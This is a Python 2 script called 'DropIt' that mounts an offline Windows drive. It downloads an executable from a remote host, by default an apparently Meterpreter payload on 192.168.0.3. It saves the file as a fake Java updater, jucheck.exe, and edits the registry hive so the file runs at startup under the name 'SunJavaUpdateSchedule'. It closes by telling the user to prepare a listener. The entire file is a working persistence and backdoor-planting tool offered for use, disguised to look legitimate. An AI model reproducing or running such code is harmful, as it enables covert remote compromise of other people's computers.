#!/usr/bin/python
import sys, argparse, os, urllib2, stat
from subprocess import check_output

# DropIt - Local Windows Installation Payload Dropper
# Written by Kerberos
#
# Usage: ./dropit.py -d WINDOWS_DRIVE_DEVICE [-w WINDOWS_MOUNT_PATH] [-p BINARY_DROP_PATH] [-u PAYLOAD_URL] [-r AUTORUN_REGISTRY_KEY [-n HKCU_USER (if using HKCU hive)] | -f] [-a KEY_VAL_NAME]
#
# {~ Defaults ~}
# -w: /mnt/win
# -p: /Windows/jucheck.exe
# -u: https://192.168.0.3/payloads/metL7331_java.exe
# -r: HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
# -a: SunJavaUpdateSchedule

def CleanUp():
        try:
                umnt = check_output(["umount", args.DevicePath])
                if umnt != "": print "Error: failed to unmount Windows drive (" + umnt + ")"
        except Exception, err:
                print "Error: failed to unmount Windows drive (%s)" % str(err)

        if os.path.exists("regmod.sh"): os.remove("regmod.sh")

# Set up parser and parse args
print "DropIt - Local Windows Installation Payload Dropper \nWritten by [Kerberos]\n"
parser = argparse.ArgumentParser()
parser.add_argument("-d", action="store", dest="DevicePath", help="The device path of the Windows drive to mount (ex: /dev/sda1).")
parser.add_argument("-w", action="store", dest="MountPath", help="The path to mount the Windows drive to (default: /mnt/win).")
parser.add_argument("-p", action="store", dest="DropPath", help="The path (relative to Windows mount point) to save the payload to (default: /Windows/jucheck.exe).")
parser.add_argument("-u", action="store", dest="PayloadURL", help="The URL to download the payload from (default: https://192.168.0.3/payloads/metL7331_java.exe).")
parser.add_argument("-n", action="store", dest="Username", help="User to inject payload under (only needed if using HKCU-based autorun key).")
parser.add_argument("-a", action="store", dest="KeyValueName", help="The name of the value to create under the registry key.")
vecGroup = parser.add_mutually_exclusive_group()
vecGroup.add_argument("-r", action="store", dest="RegKey", help="The autorun registry key to inject (default: HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run).")
vecGroup.add_argument("-f", action="store_true", dest="FileOnly", help="Only drop payload, don't touch registry (if dropping payload in autorun folder).")
args = parser.parse_args()

# Verify device path
if args.DevicePath == None:
        print "Error: you must specify the device path to the Windows drive to mount"
        exit(1)
elif not os.path.exists(args.DevicePath):
        print "Error: the specified device does not exist (" + args.DevicePath + ")"
        exit(1)

# Verify mount path
if args.MountPath == None: args.MountPath = "/mnt/win"
if not os.path.exists(args.MountPath):
        os.makedirs(args.MountPath)

# Verify drop path
if args.DropPath == None:
        args.DropPath = "/Windows/jucheck.exe"
else:
        if args.DropPath.endswith("/"):
                args.DropPath += "jucheck.exe" # Append filename none present
        if not args.DropPath.endswith(".exe"):
                # Might remove this if I decide to implement DLL sideloading or similar vectors
                print "Warning: drop path filename does not have an executable file extension (.exe)"
        if not args.DropPath.startswith("/"):
                args.DropPath = "/" + args.DropPath # Format as relative to mount point

# Verify payload URL
if args.PayloadURL == None:
        args.PayloadURL = "https://192.168.0.3/payloads/metL7331_java.exe"
elif not args.PayloadURL.endswith(".exe"):
        # ^ as per above removal message
        print "Warning: payload doesn't have an executable file extension (.exe)"

# Verify registry key
if args.RegKey == None:
        args.RegKey = "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
elif len(args.RegKey) < 14 or not args.RegKey[0:4] in ["HKLM", "HKCU"]:
        print "Error: registry key is not valid (" + ags.RegKey + ")"
        exit(1)
if args.RegKey.startswith("HKCU"):
        if args.Username == None:
                print "Error: when using HKCU-based hives you must specify a username (-n USERNAME)"
                exit(1)

# Verify value name
if args.KeyValueName == None:
        args.KeyValueName = "SunJavaUpdateSchedule"

# Mount Windows drive
try:
        mnt = check_output(["mount", args.DevicePath, args.MountPath])
        if mnt != "":
                print "Error: failed to mount Windows (" + mnt + ")"
                exit(1)
except Exception, err:
        print "Error: failed to mount Windows (%s)" % str(err)
        exit(1)

# Validate drop path
print "Checking for existence of " + args.MountPath + os.path.split(args.DropPath)[0] # Debug
if not os.path.exists(args.MountPath + os.path.split(args.DropPath)[0]):
        print "Error: the specified drop path does not exist on the mounted Windows drive (" + args.MountPath + args.DropPath + ")"
        CleanUp()
        exit(1)

# Validate username (if HKCU used)
if args.RegKey.startswith("HKCU"):
        if not os.path.exists(args.MountPath + "/Users/" + args.Username):
                print "Error: the specified user does not exist on the mounted Windows system (" + args.Username + ")"
                exit(1)
elif args.Username != None:
        print "Warning: specifying a username does literally nothing unless you specify a registry key under the HKCU hive"

# Drop payload
try:
        u = urllib2.urlopen(args.PayloadURL)
        df = open(args.MountPath + args.DropPath, "w")
        df.write(u.read())
        df.close()
        print "Saved payload to " + args.MountPath + args.DropPath
except Exception, err:
        print "Error: failed to download payload (%s)" % str(err)
        CleanUp()
        exit(1)

# Modify registry, if required
if not args.FileOnly:
        try:
                #script = "#!/usr/bin/hivexsh -wf\n\nload %mountpath%%hivepath%\ncd %regkey%\nlsval\n"

                # Write out initial hivexsh script to get existing values
                sf = open("regmod.sh", "w")
                sf.write("#!/usr/bin/hivexsh -wf\n\n")
                sf.write("load ")

                if args.RegKey.startswith("HKCU"):
                        # By specifying the user who's HKCU hive we want to inject the autorun key into, we can build the needed filesystem path
                        sf.write(args.MountPath + "/Users/" + args.Username + "/NTUSER.DAT\n")
                        sf.write("cd " + args.RegKey[5:] + "\nlsval\n")
                else:
                        # The only HKLM hive file we're interested in for autorun (there are 4) is HKLM\SOFTWARE
                        sf.write(args.MountPath + "/Windows/System32/config/SOFTWARE\n")
                        sf.write("cd " + args.RegKey[14:] + "\nlsval\n")

                # Run first version of script and store values returned
                sf.close()
                perms = os.stat("regmod.sh")
                os.chmod("regmod.sh", perms.st_mode | stat.S_IEXEC)
                hx = check_output("./regmod.sh", shell=True)
                vals = hx.splitlines()

                if len(vals) == 0 or not "=" in vals[0]:
                        print "Error: unexpected output from hivexsh script:\n" + hx
                        exit(1)

                print "Detected " + str(len(vals)) + " existing autorun entries"

                # Modify hivexsh script to maintain existing values and append the new key
                sf = open("regmod.sh", "r")
                lines = sf.read().splitlines()
                sf.close()

                if len(lines) == 0:
                        print "Error: regmod.sh got corrupted somehow"
                        CleanUp()
                        exit(1)

                lines[len(lines) - 1] = "setval " + str(len(vals) + 1) # lsval -> setval x

                # Add each existing entry to the script
                for val in vals:
                        n, v = val.split("=")
                        lines.append(n[1:-1]) # Trim quotes from start and end
                        lines.append("string:" + v.replace("\\\\", "\\")[1:-1]) # Replace double-backslash and quotes

                # Inject our new key
                lines.append(args.KeyValueName)
                lines.append("string:\"C:\\" + args.DropPath[1:].replace("/", "\\") + "\"")
                lines.append("commit")

                sf = open("regmod.sh", "w")
                for line in lines:
                        sf.write(line + "\n")

                sf.close()

                # Patch new entry in
                print "Patching new value into registry"
                hx = check_output("./regmod.sh", shell=True)

                if hx != "":
                        print "Error: unexpected output from hivexsh script:\n" + hx
                        CleanUp()
                        exit(1)

                # Success!
                print "Success! Payload has been planted, prep a listener!"
        except Exception, err:
                print "Error: failed to modify registry (%s)" % str(err)
                CleanUp()
                exit(1)

CleanUp()
